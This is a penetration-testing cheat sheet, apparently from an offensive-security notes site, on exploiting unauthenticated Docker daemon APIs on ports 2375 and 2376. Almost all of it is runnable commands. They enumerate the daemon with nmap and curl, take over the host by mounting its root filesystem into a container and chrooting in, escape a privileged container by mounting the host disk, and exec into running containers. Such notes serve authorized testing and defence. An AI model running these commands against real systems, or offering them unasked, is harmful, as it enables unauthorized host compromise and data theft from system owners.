# Docker API (2375, 2376)

!!! tip "Start here"
    Check whether the API answers without client authentication: `curl http://$IP:2375/version`. Access to a rootful Docker daemon commonly permits host-filesystem access; rootless mode and user-namespace remapping can limit impact.

!!! warning "Watch out"
    Port 2375 is conventionally unencrypted. Port 2376 conventionally uses TLS and often requires a client certificate; a TLS response without authorization is not proof of daemon control.

---

## Enumeration

```bash
nmap -sV -p 2375,2376 --script docker-version $IP
curl http://$IP:2375/version
curl http://$IP:2375/_ping
curl http://$IP:2375/info
curl http://$IP:2375/containers/json
curl -sk https://$IP:2376/version
```

---

## Interact via Docker CLI

Point your local Docker client at the remote daemon:

```bash
export DOCKER_HOST=tcp://$IP:2375
docker version
docker ps
docker images
```

---

## Host Filesystem Takeover

Mount the host root filesystem into a privileged container:

```bash
docker -H tcp://$IP:2375 run -it --rm \
  -v /:/mnt/host \
  alpine chroot /mnt/host sh
```

If the daemon is rootful and user namespaces do not remap container root, the chroot should expose the host filesystem. Verify the context before changing anything:

```bash
id
cat /etc/os-release
mount | head
```

---

## Container Escape (Privileged Container)

If you're already inside a container running with `--privileged`:

```bash
# Check if privileged
cat /proc/self/status | grep CapEff

# Mount host disk
lsblk -f
mkdir /mnt/host
mount /dev/DEVICE_PARTITION /mnt/host
chroot /mnt/host
```

Select the host root partition from `lsblk`; do not assume it is `/dev/sda1`. This path requires a privileged container and may be blocked by storage, namespace, or mandatory-access-control configuration.

---

## List and Inspect Running Containers

```bash
docker -H tcp://$IP:2375 ps -a
docker -H tcp://$IP:2375 inspect "$CONTAINER_ID"
docker -H tcp://$IP:2375 exec -it "$CONTAINER_ID" sh
```
